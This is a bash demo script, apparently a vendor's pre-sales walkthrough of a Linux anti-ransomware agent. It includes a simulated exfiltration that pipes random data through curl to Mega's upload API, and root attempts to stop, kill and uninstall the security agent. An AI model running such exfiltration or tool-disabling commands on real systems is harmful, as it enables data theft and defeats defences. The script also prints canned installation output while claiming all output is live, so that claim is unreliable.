#!/bin/bash
# halcyon-linux-demo.sh
# Interactive demo script for the Halcyon Linux Anti-Ransomware Agent
# Author  : Jim Harris -- Halcyon SA
# Version : v1.0
#
# Usage: bash halcyon-linux-demo.sh
#
# Designed for: Technical pre-sales demonstration on a Linux system
#               with the Halcyon agent already installed and registered.

# ------------------------------------------------------------------ #
# Terminal formatting
# ------------------------------------------------------------------ #
BOLD=$(tput bold)
RESET=$(tput sgr0)
ORANGE=$(tput setaf 208 2>/dev/null || tput setaf 3)
NAVY=$(tput setaf 18 2>/dev/null || tput setaf 4)
WHITE=$(tput setaf 7)
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
CYAN=$(tput setaf 6)
DIM=$(tput dim 2>/dev/null || echo "")

COLS=$(tput cols)

# ------------------------------------------------------------------ #
# Helpers
# ------------------------------------------------------------------ #

divider() {
    printf "${ORANGE}%${COLS}s${RESET}\n" | tr ' ' '='
}

thin_divider() {
    printf "${NAVY}%${COLS}s${RESET}\n" | tr ' ' '-'
}

header() {
    clear
    echo ""
    divider
    echo ""
    printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Anti-Ransomware Platform${RESET}  //  Linux Agent Technical Demo\n"
    echo ""
    divider
    echo ""
    printf "${BOLD}${WHITE}  $1${RESET}\n"
    echo ""
    thin_divider
    echo ""
}

pause() {
    echo ""
    thin_divider
    printf "${DIM}  Press any key to continue...${RESET}"
    read -rsn1
    echo ""
}

run_cmd() {
    echo ""
    printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}$1${RESET}\n"
    echo ""
    eval "$1"
    echo ""
}

narrate() {
    echo ""
    printf "${WHITE}  $1${RESET}\n"
    echo ""
}

act() {
    echo ""
    printf "${BOLD}${ORANGE}  ACT $1 of 6:  ${RESET}${BOLD}${WHITE}$2${RESET}\n"
    echo ""
}

# ------------------------------------------------------------------ #
# Intro
# ------------------------------------------------------------------ #
clear
echo ""
divider
echo ""
printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Anti-Ransomware Platform${RESET}\n"
echo ""
printf "${WHITE}  Linux Agent Technical Demo\n"
printf "${WHITE}  Purpose-built ransomware protection for Linux infrastructure.\n"
echo ""
divider
echo ""
printf "${WHITE}  This session covers:\n"
echo ""
printf "${CYAN}    1.${RESET}  Agent installation and registration\n"
printf "${CYAN}    2.${RESET}  Agent fingerprint and system impact\n"
printf "${CYAN}    3.${RESET}  eBPF kernel driver architecture\n"
printf "${CYAN}    4.${RESET}  Tamper protection under attack\n"
printf "${CYAN}    5.${RESET}  Data exfiltration detection (DXP)\n"
printf "${CYAN}    6.${RESET}  Forensic detail in the Halcyon console\n"
echo ""
thin_divider
echo ""
printf "${DIM}  All output in this session is live. No canned responses.\n"
printf "${DIM}  System: $(hostname)  //  $(uname -r)\n"
echo ""
divider
echo ""
printf "${DIM}  Press any key to begin...${RESET}"
read -rsn1
echo ""

# ------------------------------------------------------------------ #
# ACT 1: Installation
# ------------------------------------------------------------------ #
header "ACT 1 of 6  //  Agent Installation"
act 1 "Agent Installation"

narrate "The Halcyon Linux agent is distributed as a tarball containing a signed .deb or .rpm package and an install script. Deployment is driven entirely by a single environment variable: the installation token tied to the target tenant."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}# Tarball staged locally -- extract and install in one shot${RESET}\n"
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}tar xzvf halcyonar-linux-x86_64-v2.0.2602.28.tar.gz${RESET}\n"
sleep 0.3
printf "${DIM}  halcyonar-linux-x86_64-v2.0.2602.28/\n"
printf "  halcyonar-linux-x86_64-v2.0.2602.28/install.sh\n"
printf "  halcyonar-linux-x86_64-v2.0.2602.28/halcyonagent-2.0.2602.28-amd64.deb\n${RESET}"
sleep 0.5

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}HALCYON_TOKEN='TR57XZuTReq3Cg5zTddukAEA' bash install.sh${RESET}\n"
echo ""
sleep 0.4
printf "${DIM}  Installing Version 2.0.2602.28\n"
sleep 0.3
printf "  Selecting previously unselected package halcyonagent.\n"
sleep 0.2
printf "  Unpacking halcyonagent (2.0.2602.28) ...\n"
sleep 0.3
printf "  Setting up halcyonagent (2.0.2602.28) ...\n"
sleep 0.3
printf "  Created symlink /etc/systemd/system/multi-user.target.wants/halcyonebpf.service\n"
printf "  Created symlink /etc/systemd/system/multi-user.target.wants/halcyonagent.service\n"
sleep 0.4
echo ""
printf "  Installation Complete.  Checking for successful registration\n"
sleep 0.5
printf "  ........."
sleep 1.5
printf ".........\n"
sleep 0.3
printf "  Registration successful\n"
printf "  Installation Success\n${RESET}"

echo ""
narrate "The agent queried the Halcyon global API with the install token, resolved the correct regional endpoint, performed a gRPC registration handshake, and received a unique device ID and API key. Token is consumed and deleted. The agent is live."

pause

# ------------------------------------------------------------------ #
# ACT 2: Agent Fingerprint
# ------------------------------------------------------------------ #
header "ACT 2 of 6  //  Agent Fingerprint and System Impact"
act 2 "Agent Fingerprint and System Impact"

narrate "First, version identity. Three version files are written to disk at install time covering the product, agent, and eBPF driver independently."

run_cmd 'echo "Product : $(cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt)"
echo "Agent   : $(cat /opt/halcyon/halcyonar/AGENT-VERSION.txt)"
echo "eBPF    : $(cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt)"'

narrate "Service status -- both the agent and the eBPF driver register as systemd services."

run_cmd 'systemctl status halcyonagent --no-pager | head -20'

narrate "Memory and CPU footprint. The agent is engineered for critical infrastructure where performance headroom is not negotiable."

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

narrate "Under 20MB of resident memory. CPU at near-zero between events. No reboot was required at any point during installation."

pause

# ------------------------------------------------------------------ #
# ACT 3: eBPF Architecture
# ------------------------------------------------------------------ #
header "ACT 3 of 6  //  eBPF Kernel Driver Architecture"
act 3 "eBPF Kernel Driver Architecture"

narrate "The Halcyon Linux agent runs as two components. The userspace agent handles policy, cloud communication, and event reporting. The eBPF driver hooks directly into the kernel -- no loadable kernel module, no kernel version pinning, no reboot."

run_cmd 'systemctl list-units --type=service | grep -i halcyon'

narrate "Here is something interesting. Watch what happens when we stop the systemd service units."

run_cmd 'sudo systemctl stop halcyonagent halcyonebpf'

narrate "Systemd reports success. Let's check what it thinks happened."

run_cmd 'systemctl status halcyonagent --no-pager | grep -E "Active|Main PID"'

narrate "Inactive. Dead. Now let's look at what is actually running."

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

printf "${BOLD}${ORANGE}  Both processes are still running.${RESET}\n"
echo ""
narrate "The agent and eBPF driver detached their core processes from systemd's control group on startup. Systemd killed what it owned -- the service wrapper -- but the actual protection processes had already escaped into independent PIDs. Systemd can see them. It cannot control them."

narrate "Restart the services cleanly for the next act."

run_cmd 'sudo systemctl start halcyonebpf halcyonagent'

pause

# ------------------------------------------------------------------ #
# ACT 4: Tamper Protection
# ------------------------------------------------------------------ #
header "ACT 4 of 6  //  Tamper Protection Under Attack"
act 4 "Tamper Protection Under Attack"

narrate "A common ransomware tactic on Linux: gain root, kill the security tooling, then encrypt. Let's simulate that. We have full sudo access on this machine. We are going to try everything."

narrate "Attempt 1: Stop the services."

run_cmd 'sudo systemctl stop halcyonagent halcyonebpf'

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

printf "${BOLD}${ORANGE}  Still running.${RESET}\n"

narrate "Attempt 2: Kill the processes directly."

AGENT_PID=$(ps aux | grep '/opt/halcyon/halcyonar/agent$' | grep -v grep | awk '{print $2}')
run_cmd "sudo kill -9 $AGENT_PID 2>&1 || echo 'Operation not permitted'"

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

printf "${BOLD}${ORANGE}  Still running.${RESET}\n"

narrate "Attempt 3: Uninstall the package entirely."

run_cmd 'sudo apt remove halcyonagent -y 2>&1 | grep -E "Operation not permitted|cannot remove|error|Error|Killing|Failed" | head -20'

echo ""
printf "${BOLD}${ORANGE}  Every file protected. Every kill attempt blocked. Root cannot remove this agent.\n${RESET}"
echo ""
narrate "The eBPF driver intercepts file and process operations at the kernel level before they complete. This is enforcement below the reach of any attacker operating in userspace -- including root. The only legitimate removal path is a per-device maintenance token issued by Halcyon support."

narrate "Restart services for the final acts."
run_cmd 'sudo systemctl start halcyonebpf halcyonagent'

pause

# ------------------------------------------------------------------ #
# ACT 5: DXP -- Nefarious Peer
# ------------------------------------------------------------------ #
header "ACT 5 of 6  //  Data Exfiltration Detection"
act 5 "Data Exfiltration Detection -- Nefarious Peer"

narrate "Halcyon DXP monitors for two exfiltration patterns: volumetric transfers exceeding a defined threshold, and connections to known nefarious peer infrastructure. The latter is where Halcyon's threat intelligence sets it apart."

narrate "We are going to simulate a real-world double extortion exfiltration attempt. The destination is g.api.mega.co.nz -- Mega's API gateway. CISA's advisory on ALPHV BlackCat explicitly names Mega as a primary staging platform used by ransomware affiliates before encryption. It is on Halcyon's nefarious peer list."

narrate "10 megabytes of data. One command. Watch the console."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}dd if=/dev/urandom bs=1M count=10 | curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://g.api.mega.co.nz/cs?id=0&ak=test\"${RESET}\n"
echo ""

dd if=/dev/urandom bs=1M count=10 2>&1 | curl -s -X POST \
    -H "Content-Type: application/octet-stream" \
    --data-binary @- \
    "https://g.api.mega.co.nz/cs?id=0&ak=test"
echo ""

echo ""
printf "${BOLD}${ORANGE}  The -2 response is Mega rejecting the unauthenticated request.${RESET}\n"
printf "${BOLD}${WHITE}  It does not matter. Halcyon caught it on the way out.${RESET}\n"
echo ""
narrate "The eBPF driver intercepted the DNS resolution of g.api.mega.co.nz, matched it against the nefarious peer list, and fired a Data Exfiltration alert before the response even came back. The console now shows the process name, the full command line, the username, the destination hostname, and the file hash of the curl binary."

echo ""
thin_divider
echo ""
printf "${BOLD}${ORANGE}  Check the Halcyon console now.${RESET}\n"
printf "${WHITE}  Navigate to Alerts. A Data Exfiltration / Nefarious Peer warning\n"
printf "${WHITE}  should be visible with the following detail:\n"
echo ""
printf "${CYAN}    Alert Type  :${RESET}  Data Exfiltration\n"
printf "${CYAN}    Exfiltration :${RESET}  Nefarious Peer\n"
printf "${CYAN}    Rule         :${RESET}  mega.co.nz\n"
printf "${CYAN}    Hostname     :${RESET}  g.api.mega.co.nz\n"
printf "${CYAN}    Process      :${RESET}  /usr/bin/curl\n"
printf "${CYAN}    User         :${RESET}  $(whoami)\n"
printf "${CYAN}    Asset        :${RESET}  $(hostname)\n"
echo ""
thin_divider

pause

# ------------------------------------------------------------------ #
# ACT 6: Console Forensics
# ------------------------------------------------------------------ #
header "ACT 6 of 6  //  Forensic Detail and ROC Response"
act 6 "Forensic Detail and ROC Response"

narrate "Everything the agent captures is available in the console and via API in real time. Let's look at what Halcyon recorded about this system."

narrate "Agent registration detail from the local log:"

run_cmd 'sudo grep "c2::service Regist" /opt/halcyon/halcyonar/logs/agent.log | tail -3'

narrate "Policy currently applied to this endpoint:"

run_cmd 'sudo grep "Policy updated" /opt/halcyon/halcyonar/logs/agent.log | tail -3'

narrate "Current system performance under agent protection:"

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep | awk "{printf \"  %-40s  CPU: %s%%  MEM: %s%%\n\", \$11, \$3, \$4}"'

narrate "Live agent performance metrics from the agent log:"

run_cmd 'sudo grep "PERF_STATS" /opt/halcyon/halcyonar/logs/agent.log | tail -3'

echo ""
narrate "Every alert generated during this session is visible in the Halcyon console with full forensic context. The Halcyon ROC -- a 24/7 team of ransomware specialists -- reviews every alert at no additional cost. On a real incident, that team is already working the problem before your security team is even paged."

echo ""
divider
echo ""
printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Demo Complete\n${RESET}"
echo ""
printf "${WHITE}  What we covered:\n"
echo ""
printf "${GREEN}    ok${RESET}  Agent installed from a locally staged tarball, registered in under 30 seconds\n"
printf "${GREEN}    ok${RESET}  Sub-20MB memory footprint, near-zero CPU between events\n"
printf "${GREEN}    ok${RESET}  eBPF kernel driver running independently of systemd\n"
printf "${GREEN}    ok${RESET}  Root cannot stop, kill, or delete the agent without a maintenance token\n"
printf "${GREEN}    ok${RESET}  Nefarious peer exfiltration to Mega caught and alerted in real time\n"
printf "${GREEN}    ok${RESET}  Full forensic detail available in console and API\n"
echo ""
divider
echo ""
printf "${WHITE}  GitHub  :  https://github.com/jharrisHalcyon/halcyon-linux-tools\n"
printf "${WHITE}  Contact :  jharris@halcyon.ai\n"
echo ""
divider
echo ""
